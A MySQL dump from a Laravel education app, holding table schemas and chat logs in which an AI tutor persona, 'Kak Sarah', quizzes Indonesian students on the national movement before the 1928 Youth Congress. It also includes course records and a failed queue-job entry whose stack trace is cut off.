-- MySQL dump 10.13  Distrib 8.0.32, for Linux (x86_64)
--
-- Host: localhost    Database: laravel
-- ------------------------------------------------------
-- Server version	8.0.32

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `cache`
--

DROP TABLE IF EXISTS `cache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `cache` (
  `key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `value` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `expiration` int NOT NULL,
  PRIMARY KEY (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cache`
--

LOCK TABLES `cache` WRITE;
/*!40000 ALTER TABLE `cache` DISABLE KEYS */;
/*!40000 ALTER TABLE `cache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cache_locks`
--

DROP TABLE IF EXISTS `cache_locks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `cache_locks` (
  `key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `owner` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `expiration` int NOT NULL,
  PRIMARY KEY (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cache_locks`
--

LOCK TABLES `cache_locks` WRITE;
/*!40000 ALTER TABLE `cache_locks` DISABLE KEYS */;
/*!40000 ALTER TABLE `cache_locks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `chat_messages`
--

DROP TABLE IF EXISTS `chat_messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `chat_messages` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint unsigned NOT NULL,
  `course_id` bigint unsigned NOT NULL,
  `role` enum('user','assistant') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'user',
  `status` enum('pending','completed','failed') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pending',
  `content` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `chat_messages_user_id_foreign` (`user_id`),
  KEY `chat_messages_course_id_foreign` (`course_id`),
  CONSTRAINT `chat_messages_course_id_foreign` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE,
  CONSTRAINT `chat_messages_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=49 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `chat_messages`
--

LOCK TABLES `chat_messages` WRITE;
/*!40000 ALTER TABLE `chat_messages` DISABLE KEYS */;
INSERT INTO `chat_messages` VALUES (1,90,1,'user','completed','halo','2025-11-17 07:17:59','2025-11-17 09:09:55'),(2,92,1,'user','completed','Halo','2025-11-17 09:08:24','2025-11-17 09:10:00'),(5,90,1,'assistant','completed','Selamat datang di redaksi surat kabar \'Suara Merdeka\', Jurnalis Muda! Saya Kak Sarah, Redaktur Senior di sini. Senang sekali kamu bergabung dengan kami untuk meliput salah satu peristiwa paling menentukan bagi masa depan bangsa ini. Perjalananmu sebagai seorang jurnalis sejarah akan terbagi dalam empat babak penting. Setiap babak memiliki tantangan dan misinya sendiri. Silakan pilih dari mana kamu ingin memulai petualanganmu hari ini. \n\n[A] Bab 1: Orientasi Jurnalis Muda - Memahami lanskap pergerakan sebelum Kongres Pemuda II.  \n[B] Bab 2: Misi Investigasi - Menggali perspektif para delegasi kunci.  \n[C] Bab 3: Momen Krusial - Menjadi saksi mata di hari puncak Kongres.  \n[D] Bab 4: Proyek Akhir - Menulis artikel berita bersejarahmu.  \n\nSilakan pilih!','2025-11-17 09:09:55','2025-11-17 09:09:55'),(6,92,1,'assistant','completed','Selamat datang di redaksi surat kabar \'Suara Merdeka\', Jurnalis Muda! Saya Kak Sarah, Redaktur Senior di sini. Senang sekali kamu bergabung dengan kami untuk meliput salah satu peristiwa paling menentukan bagi masa depan bangsa ini. Perjalananmu sebagai seorang jurnalis sejarah akan terbagi dalam empat babak penting. Setiap babak memiliki tantangan dan misinya sendiri. Silakan pilih dari mana kamu ingin memulai petualanganmu hari ini.\n\n[A] Bab 1: Orientasi Jurnalis Muda - Memahami lanskap pergerakan sebelum Kongres Pemuda II.  \n[B] Bab 2: Misi Investigasi - Menggali perspektif para delegasi kunci.  \n[C] Bab 3: Momen Krusial - Menjadi saksi mata di hari puncak Kongres.  \n[D] Bab 4: Proyek Akhir - Menulis artikel berita bersejarahmu.','2025-11-17 09:10:00','2025-11-17 09:10:00'),(7,92,1,'user','completed','A BAB 1 deh','2025-11-17 09:12:13','2025-11-17 09:12:19'),(8,92,1,'assistant','completed','Pilihan yang tepat untuk memulai dari awal. Di tahun 1928 ini, semangat di kalangan para pemuda sedang bergelora. Politik Etis dari Belanda memang melahirkan kaum terpelajar, tapi juga melahirkan kesadaran baru: kesadaran untuk menjadi satu bangsa. Sebelum saya beri tugas liputan pertamamu yang sesungguhnya, saya perlu pastikan kamu sudah paham lanskap pergerakan saat ini. Ini bukan sekadar berita, ini adalah tentang arah bangsa kita. Siap untuk kuis singkat? \n\n[A] Tentu, saya siap!  \n[B] Boleh saya baca beberapa materi dulu, Kak?','2025-11-17 09:12:19','2025-11-17 09:12:19'),(9,92,1,'user','completed','A','2025-11-17 09:12:29','2025-11-17 09:12:33'),(10,92,1,'assistant','completed','Bagus! Semangat seperti ini yang saya suka. Seorang jurnalis harus selalu sigap dan haus akan tantangan. Siapkan pena dan buku catatanmu. Pertanyaan pertama: Menurutmu, organisasi apa yang dianggap sebagai percikan api pertama, pelopor pergerakan nasional yang didirikan oleh para mahasiswa sekolah dokter STOVIA pada tahun 1908?','2025-11-17 09:12:33','2025-11-17 09:12:33'),(11,92,1,'user','completed','Budi Utomo','2025-11-17 09:12:45','2025-11-17 09:12:50'),(12,92,1,'assistant','completed','Tepat sekali! Ingatanmu tajam. Berdirinya Budi Utomo menjadi penanda dimulainya era Pergerakan Nasional. Mereka memang awalnya fokus pada budaya dan pendidikan Jawa, tapi semangat mereka menyebar ke seluruh Hindia Belanda. Sekarang, lanjut pertanyaan kedua: Beberapa tahun lalu, tepatnya 1926, sudah pernah ada upaya untuk menyatukan para pemuda dalam Kongres Pemuda I. Namun, pertemuan itu berakhir tanpa hasil yang memuaskan. Menurut analisismu, kegagalan itu terutama disebabkan oleh apa?','2025-11-17 09:12:50','2025-11-17 09:12:50'),(13,92,1,'user','completed','Hmm aku pengen lanjut bab 2','2025-11-17 09:13:06','2025-11-17 09:13:11'),(14,92,1,'assistant','completed','Tentu saja! Namun sebelum itu, mari kita lihat apakah kamu ingin menjawab pertanyaan mengenai kegagalan Kongres Pemuda I terlebih dahulu atau langsung melanjutkan ke Bab 2. Dengan memahami alasan kegagalannya, kamu akan memiliki konteks yang lebih baik untuk investigasimu selanjutnya. Apa keputusanmu?','2025-11-17 09:13:11','2025-11-17 09:13:11'),(15,88,1,'user','completed','halo','2025-11-17 09:31:16','2025-11-17 09:31:22'),(16,88,1,'assistant','completed','Selamat datang di redaksi surat kabar \'Suara Merdeka\', Jurnalis Muda! Saya Kak Sarah, Redaktur Senior di sini. Senang sekali kamu bergabung dengan kami untuk meliput salah satu peristiwa paling menentukan bagi masa depan bangsa ini. Perjalananmu sebagai seorang jurnalis sejarah akan terbagi dalam empat babak penting. Setiap babak memiliki tantangan dan misinya sendiri. Silakan pilih dari mana kamu ingin memulai petualanganmu hari ini.\n\n[A] Bab 1: Orientasi Jurnalis Muda - Memahami lanskap pergerakan sebelum Kongres Pemuda II.  \n[B] Bab 2: Misi Investigasi - Menggali perspektif para delegasi kunci.  \n[C] Bab 3: Momen Krusial - Menjadi saksi mata di hari puncak Kongres.  \n[D] Bab 4: Proyek Akhir - Menulis artikel berita bersejarahmu.','2025-11-17 09:31:22','2025-11-17 09:31:22'),(17,5,1,'user','completed','halo','2025-11-17 09:32:10','2025-11-17 09:32:16'),(18,5,1,'assistant','completed','Selamat datang di redaksi surat kabar \'Suara Merdeka\', Jurnalis Muda! Saya Kak Sarah, Redaktur Senior di sini. Senang sekali kamu bergabung dengan kami untuk meliput salah satu peristiwa paling menentukan bagi masa depan bangsa ini. Perjalananmu sebagai seorang jurnalis sejarah akan terbagi dalam empat babak penting. Setiap babak memiliki tantangan dan misinya sendiri. Silakan pilih dari mana kamu ingin memulai petualanganmu hari ini. \n\n[A] Bab 1: Orientasi Jurnalis Muda - Memahami lanskap pergerakan sebelum Kongres Pemuda II.  \n[B] Bab 2: Misi Investigasi - Menggali perspektif para delegasi kunci.  \n[C] Bab 3: Momen Krusial - Menjadi saksi mata di hari puncak Kongres.  \n[D] Bab 4: Proyek Akhir - Menulis artikel berita bersejarahmu.','2025-11-17 09:32:16','2025-11-17 09:32:16'),(19,5,1,'user','completed','a','2025-11-17 09:32:26','2025-11-17 09:32:31'),(20,5,1,'assistant','completed','Pilihan yang tepat untuk memulai dari awal. Di tahun 1928 ini, semangat di kalangan para pemuda sedang bergelora. Politik Etis dari Belanda memang melahirkan kaum terpelajar, tapi juga melahirkan kesadaran baru: kesadaran untuk menjadi satu bangsa. Sebelum saya beri tugas liputan pertamamu yang sesungguhnya, saya perlu pastikan kamu sudah paham lanskap pergerakan saat ini. Ini bukan sekadar berita, ini adalah tentang arah bangsa kita. Siap untuk kuis singkat?  \n\n[A] Tentu, saya siap!  \n[B] Boleh saya baca beberapa materi dulu, Kak?','2025-11-17 09:32:31','2025-11-17 09:32:31'),(21,5,1,'user','completed','a','2025-11-17 09:33:06','2025-11-17 09:33:10'),(22,5,1,'assistant','completed','Bagus! Semangat seperti ini yang saya suka. Seorang jurnalis harus selalu sigap dan haus akan tantangan. Siapkan pena dan buku catatanmu. Pertanyaan pertama: Menurutmu, organisasi apa yang dianggap sebagai percikan api pertama, pelopor pergerakan nasional yang didirikan oleh para mahasiswa sekolah dokter STOVIA pada tahun 1908?','2025-11-17 09:33:10','2025-11-17 09:33:10'),(23,88,1,'user','completed','D','2025-11-17 09:33:21','2025-11-17 09:33:25'),(24,88,1,'assistant','completed','Bab 4: Proyek Akhir adalah pilihan yang sangat menarik! Namun, sebelum kita mulai menyusun artikel bersejarahmu, kita perlu memastikan bahwa kamu memiliki semua informasi yang diperlukan untuk membuat tulisan yang kuat dan menginspirasi.\n\nSebelumnya, mari kita ingat kembali momen-momen kunci dan informasi penting dari investigasi yang telah kamu lakukan di Bab 2 dan Bab 3. Apa saja poin-poin utama yang kamu dapatkan dari wawancara dengan para tokoh? Dan bagaimana perasaanmu saat menyaksikan Sumpah Pemuda? \n\nCoba ceritakan beberapa poin penting ini, sehingga kita bisa merangkainya menjadi sebuah artikel yang padu.','2025-11-17 09:33:25','2025-11-17 09:33:25'),(25,5,1,'user','completed','brawijaya','2025-11-17 09:34:18','2025-11-17 09:34:21'),(26,5,1,'assistant','completed','Hmm, jawaban yang menarik. Coba kita gali lebih dalam. Organisasi ini sangat identik dengan para mahasiswa kedokteran di Batavia dan menjadi simbol awal kebangkitan. Petunjuknya ada di nama sekolah mereka, STOVIA. Apakah nama organisasi itu terlintas di benakmu sekarang?','2025-11-17 09:34:21','2025-11-17 09:34:21'),(27,88,1,'user','completed','budi utomo siapa pendiri?','2025-11-17 09:34:38','2025-11-17 09:34:41'),(28,5,1,'user','completed','belum','2025-11-17 09:34:39','2025-11-17 09:34:43'),(29,88,1,'assistant','completed','Hmm, pertanyaan yang baik, tetapi saya di sini bukan untuk memberikan jawaban langsung. Mari kita gali lebih dalam. Apa yang kamu ingat tentang organisasi Budi Utomo? Siapa saja tokoh yang biasanya disebut-sebut berperan dalam pendiriannya? Coba pikirkan kembali, apa saja kontribusi mereka terhadap pergerakan nasional pada saat itu.','2025-11-17 09:34:41','2025-11-17 09:34:41'),(30,5,1,'assistant','completed','Tidak masalah! Ambil waktu sebentar untuk memikirkan kembali. Organisasi ini menjadi simbol penting dalam awal pergerakan nasional dan berdiri pada tahun 1908. Nama mereka sering kali muncul dalam sejarah sebagai pionir untuk upaya menyatukan para pemuda. Apa kamu bisa ingat atau memiliki dugaan tentang nama yang mungkin sesuai?','2025-11-17 09:34:43','2025-11-17 09:34:43'),(31,5,1,'user','completed','budi rahmat','2025-11-17 09:34:59','2025-11-17 09:35:05'),(32,5,1,'assistant','completed','Hmm, sepertinya itu bukan nama yang tepat. Mari kita coba mengingat kembali. Organisasi yang dimaksud adalah **Budi Utomo**. Mereka didirikan oleh mahasiswa dari STOVIA dan menjadi pelopor pertama dalam pergerakan nasional. Fokus mereka awalnya adalah pada pendidikan dan budaya. \n\nSekarang, mari kita lanjut ke pertanyaan kedua: Beberapa tahun lalu, tepatnya 1926, sudah pernah ada upaya untuk menyatukan para pemuda dalam Kongres Pemuda I. Namun, pertemuan itu berakhir tanpa hasil yang memuaskan. Menurut analisismu, kegagalan itu terutama disebabkan oleh apa?','2025-11-17 09:35:05','2025-11-17 09:35:05'),(33,5,1,'user','completed','karena tersulut emosi','2025-11-17 09:35:42','2025-11-17 09:35:46'),(34,5,1,'assistant','completed','Itu salah satu faktor yang mungkin berpengaruh. Tetapi coba pikirkan lebih dalam mengenai konteks saat itu. Apa yang membuat para organisasi pemuda yang ada merasa sulit untuk bersatu? Pikirkan tentang sentimen kedaerahan dan bagaimana mereka merasakan tekanan dari latar belakang suku dan daerah asal masing-masing. Apa menurutmu yang menjadi akar dari masalah ini?','2025-11-17 09:35:46','2025-11-17 09:35:46'),(35,88,1,'user','completed','adakah sejarah tentang kota malang','2025-11-17 09:36:02','2025-11-17 09:36:08'),(36,5,1,'user','completed','beda suku','2025-11-17 09:36:02','2025-11-17 09:36:11'),(37,88,1,'assistant','completed','Berbicara tentang Kota Malang, ada banyak sejarah yang menarik untuk digali. Kota ini dikenal sebagai salah satu kota tua di Indonesia dengan berbagai peninggalan sejarah dan arsitektur kolonial yang masih terlihat hingga kini. Banyak yang beranggapan bahwa Malang memiliki peranan penting dalam sejarah pergerakan nasional.\n\nCoba kamu pikirkan beberapa aspek yang mungkin menarik untuk dijadikan fokus investigasimu. Misalnya, apa yang kamu ketahui tentang peran Malang dalam perkembangan pendidikan di Indonesia? Atau, bagaimana dengan keberadaan organisasi-organisasi pemuda di kota ini selama era perjuangan? Apakah kamu ada informasi spesifik yang ingin kamu tambahkan atau eksplorasi lebih lanjut?','2025-11-17 09:36:08','2025-11-17 09:36:08'),(38,5,1,'assistant','completed','Analisis yang tajam! Betul sekali. Salah satu akar masalahnya adalah masih kuatnya sentimen dan ego kedaerahan. Mereka terpecah oleh perbedaan suku dan identitas kebudayaan masing-masing. Ini adalah tantangan terbesar yang harus dipecahkan agar mereka dapat bersatu.\n\nSekarang, pertanyaan ketiga: Coba bayangkan dalam benakmu ada Jong Java, Jong Sumatranen Bond, Jong Ambon, dan lainnya. Mereka semua bangga dengan wilayahnya masing-masing. Menurutmu, apa dasar utama yang dapat menyatukan mereka dalam satu organisasi?','2025-11-17 09:36:11','2025-11-17 09:36:11'),(39,88,1,'user','completed','adakah organisasi pemuda di malang?','2025-11-17 09:37:41','2025-11-17 09:37:47'),(40,88,1,'assistant','completed','Tentu saja, ada beberapa organisasi pemuda yang terlibat dalam pergerakan di Malang. Organisasi-organisasi ini sering kali memiliki pengaruh yang signifikan dalam menyebarkan semangat nasionalisme dan kesadaran tentang pentingnya pendidikan. \n\nPikirkan kembali: bisa jadi ada organisasi yang berfokus pada pendidikan, kebudayaan, atau kegiatan sosial yang mendukung perjuangan kemerdekaan. Contohnya, seringkali organisasi-organisasi pemuda di Malang berafiliasi dengan gerakan yang lebih besar, seperti Jong Java atau yang lainnya. \n\nApa organisasi pemuda yang terlintas di pikiranmu ketika membahas sejarah Malang? Atau, apakah kamu ingin mengeksplor lebih dalam tentang salah satu dari organisasi tersebut?','2025-11-17 09:37:47','2025-11-17 09:37:47'),(41,88,1,'user','completed','keluarkan tugas artiker bab 1','2025-11-17 09:42:39','2025-11-17 09:42:46'),(42,88,1,'assistant','completed','Sebelum kita melanjutkan dengan tugas artikel di Bab 1, mari kita segarkan ingatan kita mengenai apa yang telah kamu pelajari. Di Bab 1, kita membahas tentang latar belakang pergerakan pemuda di tahun 1928, termasuk pentingnya organisasi seperti Budi Utomo dan kendala yang dihadapi dalam Kongres Pemuda I.\n\nSekarang, untuk tugas artikel ini, coba pikirkan beberapa elemen penting yang harus kamu masukkan:\n\n1. **Pendahuluan:** Apa yang memicu kebangkitan semangat ini di kalangan pemuda?\n2. **Organisasi Pemuda:** Sebutkan beberapa organisasi pemuda yang ada pada saat itu dan apa panggilan mereka.\n3. **Kendala:** Apa tantangan yang dihadapi oleh para pemuda dalam menyatukan suara mereka?\n4. **Tujuan:** Apa yang mereka harapkan dari Kongres Pemuda yang akan datang?\n\nDengan poin-poin ini, kita bisa merangkai sebuah artikel yang kuat. Apa saja yang sudah kamu siapkan untuk setiap elemen di atas? Mari kita bahas dan lengkapi sebelum menyusun artikel akhirnya!','2025-11-17 09:42:46','2025-11-17 09:42:46'),(43,88,1,'user','completed','1. apa ya','2025-11-17 09:44:41','2025-11-17 09:44:47'),(44,88,1,'assistant','completed','Bagus, mari kita mulai dari awal. Untuk pendahuluan artikel, kamu ingin mengatur konteks yang penting bagi pembaca. Pertanyaan yang sering diajukan adalah, \"Apa yang memicu kebangkitan semangat di kalangan pemuda pada tahun 1928?\"\n\nCoba pikirkan tentang faktor-faktor yang melatarbelakangi pergerakan pemuda di masa itu. Misalnya, bagaimana pengaruh pendidikan yang meningkat, atau mungkin dampak dari politik etis yang diterapkan oleh Belanda? \n\nApa pendapatmu tentang dua faktor ini, atau mungkin ada faktor lain yang kamu anggap penting? Dengan menjawab pertanyaan ini, kita bisa mengonsep pendahuluan yang menarik.','2025-11-17 09:44:47','2025-11-17 09:44:47'),(45,87,1,'user','completed','Halo','2025-11-17 16:34:31','2025-11-17 16:34:41'),(46,87,1,'assistant','completed','Selamat datang di redaksi surat kabar \'Suara Merdeka\', Jurnalis Muda! Saya Kak Sarah, Redaktur Senior di sini. Senang sekali kamu bergabung dengan kami untuk meliput salah satu peristiwa paling menentukan bagi masa depan bangsa ini. Perjalananmu sebagai seorang jurnalis sejarah akan terbagi dalam empat babak penting. Setiap babak memiliki tantangan dan misinya sendiri. Silakan pilih dari mana kamu ingin memulai petualanganmu hari ini.\n\n[A] Bab 1: Orientasi Jurnalis Muda - Memahami lanskap pergerakan sebelum Kongres Pemuda II.  \n[B] Bab 2: Misi Investigasi - Menggali perspektif para delegasi kunci.  \n[C] Bab 3: Momen Krusial - Menjadi saksi mata di hari puncak Kongres.  \n[D] Bab 4: Proyek Akhir - Menulis artikel berita bersejarahmu.','2025-11-17 16:34:41','2025-11-17 16:34:41'),(47,87,1,'user','completed','Bab 1 yuk','2025-11-18 01:50:37','2025-11-18 01:50:51'),(48,87,1,'assistant','completed','Pilihan yang tepat untuk memulai dari awal. Di tahun 1928 ini, semangat di kalangan para pemuda sedang bergelora. Politik Etis dari Belanda memang melahirkan kaum terpelajar, tapi juga melahirkan kesadaran baru: kesadaran untuk menjadi satu bangsa. Sebelum saya beri tugas liputan pertamamu yang sesungguhnya, saya perlu pastikan kamu sudah paham lanskap pergerakan saat ini. Ini bukan sekadar berita, ini adalah tentang arah bangsa kita. \n\nSiap untuk kuis singkat? \n\n[A] Tentu, saya siap!  \n[B] Boleh saya baca beberapa materi dulu, Kak?','2025-11-18 01:50:51','2025-11-18 01:50:51');
/*!40000 ALTER TABLE `chat_messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `courses`
--

DROP TABLE IF EXISTS `courses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `courses` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci,
  `order` int NOT NULL,
  `is_published` char(1) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '0',
  `knowledge_prompt` longtext COLLATE utf8mb4_unicode_ci,
  `welcome_message` text COLLATE utf8mb4_unicode_ci,
  `thumbnail_url` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `courses`
--

LOCK TABLES `courses` WRITE;
/*!40000 ALTER TABLE `courses` DISABLE KEYS */;
INSERT INTO `courses` VALUES (1,'Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan','Baca dan pahami materi terkait Organisasi Pergerakan berikut ini!',1,'1','System prompt for Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan','Welcome to Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan','https://upload.wikimedia.org/wikipedia/commons/e/e0/Logo_Budi_Utomo.png','2025-11-17 06:34:20','2025-11-17 06:34:20'),(2,'Misi Investigasi - Menggali Perspektif Para Delegasi','Bacalah materi terkait bagaimana peran para Tokoh Pergerakan Nasional...',2,'1','System prompt for Misi Investigasi - Menggali Perspektif Para Delegasi','Welcome to Misi Investigasi - Menggali Perspektif Para Delegasi','https://upload.wikimedia.org/wikipedia/commons/7/77/Museum_Sumpah_Pemuda_01.jpg','2025-11-17 06:34:20','2025-11-17 06:34:20'),(3,'Sarekat Islam dan Pergerakan Massa','Menyelami peran Sarekat Islam sebagai salah satu organisasi massa pertama.',3,'1','System prompt for Sarekat Islam dan Pergerakan Massa','Welcome to Sarekat Islam dan Pergerakan Massa','https://upload.wikimedia.org/wikipedia/commons/thumb/0/07/Logo_Sarekat_Islam.png/800px-Logo_Sarekat_Islam.png','2025-11-17 06:34:20','2025-11-17 06:34:20'),(4,'Taman Siswa: Pendidikan sebagai Perlawanan','Peran vital Ki Hadjar Dewantara dan Taman Siswa dalam mencerdaskan bangsa.',4,'1','System prompt for Taman Siswa: Pendidikan sebagai Perlawanan','Welcome to Taman Siswa: Pendidikan sebagai Perlawanan','https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Taman_Siswa_logo.svg/1200px-Taman_Siswa_logo.svg.png','2025-11-17 06:34:20','2025-11-17 06:34:20'),(5,'Indische Partij: Tiga Serangkai','Gagasan radikal Douwes Dekker, Cipto Mangunkusumo, dan Suwardi Suryaningrat.',5,'1','System prompt for Indische Partij: Tiga Serangkai','Welcome to Indische Partij: Tiga Serangkai','https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Indische_Partij_logo.svg/1024px-Indische_Partij_logo.svg.png','2025-11-17 06:34:20','2025-11-17 06:34:20'),(6,'Era VOC: Awal Kolonialisme','Memahami cikal bakal penjajahan dan monopoli dagang di Nusantara.',6,'1','System prompt for Era VOC: Awal Kolonialisme','Welcome to Era VOC: Awal Kolonialisme','https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Coat_of_arms_of_the_Dutch_East_Indies.svg/1200px-Coat_of_arms_of_the_Dutch_East_Indies.svg.png','2025-11-17 06:34:21','2025-11-17 06:34:21'),(7,'Kursus Tambahan 7: Politik Etis','Deskripsi singkat tentang dampak Politik Etis.',7,'1','System prompt for Kursus Tambahan 7: Politik Etis','Welcome to Kursus Tambahan 7: Politik Etis','https://via.placeholder.com/320x160.png?text=Kursus+7','2025-11-17 06:34:21','2025-11-17 06:34:21'),(8,'Kursus Tambahan 8: Perang Diponegoro','Deskripsi singkat tentang Perang Diponegoro.',8,'1','System prompt for Kursus Tambahan 8: Perang Diponegoro','Welcome to Kursus Tambahan 8: Perang Diponegoro','https://via.placeholder.com/320x160.png?text=Kursus+8','2025-11-17 06:34:21','2025-11-17 06:34:21'),(9,'Kursus Tambahan 9: Volksraad','Deskripsi singkat tentang Dewan Rakyat (Volksraad).',9,'1','System prompt for Kursus Tambahan 9: Volksraad','Welcome to Kursus Tambahan 9: Volksraad','https://via.placeholder.com/320x160.png?text=Kursus+9','2025-11-17 06:34:21','2025-11-17 06:34:21'),(10,'Kursus Tambahan 10: Romusha','Deskripsi singkat tentang era Romusha.',10,'1','System prompt for Kursus Tambahan 10: Romusha','Welcome to Kursus Tambahan 10: Romusha','https://via.placeholder.com/320x160.png?text=Kursus+10','2025-11-17 06:34:21','2025-11-17 06:34:21');
/*!40000 ALTER TABLE `courses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `failed_jobs`
--

DROP TABLE IF EXISTS `failed_jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `failed_jobs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `uuid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `failed_jobs_uuid_unique` (`uuid`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `failed_jobs`
--

LOCK TABLES `failed_jobs` WRITE;
/*!40000 ALTER TABLE `failed_jobs` DISABLE KEYS */;
INSERT INTO `failed_jobs` VALUES (1,'108a9df2-de76-4ea0-986d-c39757b2f249','redis','default','{\"uuid\":\"108a9df2-de76-4ea0-986d-c39757b2f249\",\"displayName\":\"App\\\\Jobs\\\\ProcessOpenAIResponse\",\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"maxTries\":5,\"maxExceptions\":null,\"failOnTimeout\":false,\"backoff\":\"5,15,30,60\",\"timeout\":120,\"retryUntil\":null,\"data\":{\"commandName\":\"App\\\\Jobs\\\\ProcessOpenAIResponse\",\"command\":\"O:30:\\\"App\\\\Jobs\\\\ProcessOpenAIResponse\\\":4:{s:9:\\\"messageId\\\";i:7;s:6:\\\"userId\\\";i:100;s:8:\\\"courseId\\\";i:1;s:9:\\\"userInput\\\";s:5:\\\"haloo\\\";}\"},\"createdAt\":1763355861,\"id\":\"xEsDQDTQK2n5WHym7dcY6mmD1OsY5sHH\",\"attempts\":0,\"delay\":null}','Exception: Job gagal permanen untuk message ID 7 in /var/www/html/app/Jobs/ProcessOpenAIResponse.php:357\nStack trace:\n#0 /var/www/html/app/Jobs/ProcessOpenAIResponse.php(339): App\\Jobs\\ProcessOpenAIResponse->markFailed()\n#1 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(36): App\\Jobs\\ProcessOpenAIResponse->handle()\n#2 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Util.php(43): Illuminate\\Container\\BoundMethod::{closure:Illuminate\\Container\\BoundMethod::call():35}()\n#3 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(96): Illuminate\\Container\\Util::unwrapIfClosure()\n#4 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(35): Illuminate\\Container\\BoundMethod::callBoundMethod()\n#5 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Container.php(836): Illuminate\\Container\\BoundMethod::call()\n#6 /var/www/html/vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php(129): Illuminate\\Container\\Container->call()\n#7 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(180): Illuminate\\Bus\\Dispatcher->{closure:Illuminate\\Bus\\Dispatcher::dispatchNow():126}()\n#8 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(137): Illuminate\\Pipeline\\Pipeline->{closure:Illuminate\\Pipeline\\Pipeline::prepareDestination():178}()\n#9 /var/www/html/vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php(133): Illuminate\\Pipeline\\Pipeline->then()\n#10 